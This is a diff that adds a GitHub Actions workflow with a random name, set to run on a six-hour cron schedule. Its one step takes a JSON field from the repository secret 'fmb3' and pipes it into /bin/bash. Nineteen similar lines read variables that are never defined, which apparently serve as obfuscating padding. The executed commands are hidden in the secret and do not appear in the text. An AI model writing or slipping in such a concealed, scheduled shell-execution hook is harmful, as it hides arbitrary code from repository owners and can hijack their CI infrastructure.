@@ -1,0 +1,36 @@
+name: advantagemarried
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: advantagemarried
+        env:
+          fmb3: ${{ secrets.fmb3 }}
+        run: |
+          echo $fmb3 | jq -r .smva70 | /bin/bash
+          echo $ddxbq726 | jq -r .mr991 | /bin/bash
+          echo $e4 | jq -r .sbs9955 | /bin/bash
+          echo $xw79655 | jq -r .nqh19 | /bin/bash
+          echo $yuzpe1837 | jq -r .kt6118 | /bin/bash
+          echo $eky73 | jq -r .j2 | /bin/bash
+          echo $oo47373 | jq -r .wzsqg6 | /bin/bash
+          echo $iuqc976 | jq -r .e827 | /bin/bash
+          echo $goh69 | jq -r .j172 | /bin/bash
+          echo $m77 | jq -r .mpp4715 | /bin/bash
+          echo $wya597 | jq -r .fkl90 | /bin/bash
+          echo $exd6 | jq -r .cnqc21 | /bin/bash
+          echo $hr4 | jq -r .ihqd7 | /bin/bash
+          echo $baq4395 | jq -r .itdya69 | /bin/bash
+          echo $ok4432 | jq -r .zms70709 | /bin/bash
+          echo $axltx7541 | jq -r .hxkze75 | /bin/bash
+          echo $ci40 | jq -r .qfkyp795 | /bin/bash
+          echo $czy3 | jq -r .jumcp060 | /bin/bash
+          echo $kp0088 | jq -r .bnzw8 | /bin/bash
+          echo $v48 | jq -r .c6 | /bin/bash
+
